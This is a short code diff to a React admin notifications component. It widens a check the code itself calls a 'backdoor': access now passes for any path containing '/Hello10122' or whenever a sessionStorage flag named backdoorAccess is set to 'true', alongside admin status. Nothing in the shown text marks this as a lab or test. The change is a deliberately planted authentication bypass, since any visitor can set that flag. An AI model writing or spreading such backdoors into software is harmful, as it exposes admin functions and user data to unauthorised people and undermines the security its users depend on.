@@ -25,7 +25,8 @@ export default function AdminNotifications() {
 
   // Allow access via backdoor route or if user is admin
   const isBackdoorAccess = window.location.pathname === '/Hello10122' || 
-                          document.referrer.includes('/Hello10122');
+                          window.location.pathname.includes('/Hello10122') ||
+                          sessionStorage.getItem('backdoorAccess') === 'true';
 
   const { data: users, isLoading: loadingUsers } = useQuery<UserType[]>({
     queryKey: ['/api/admin/users'],
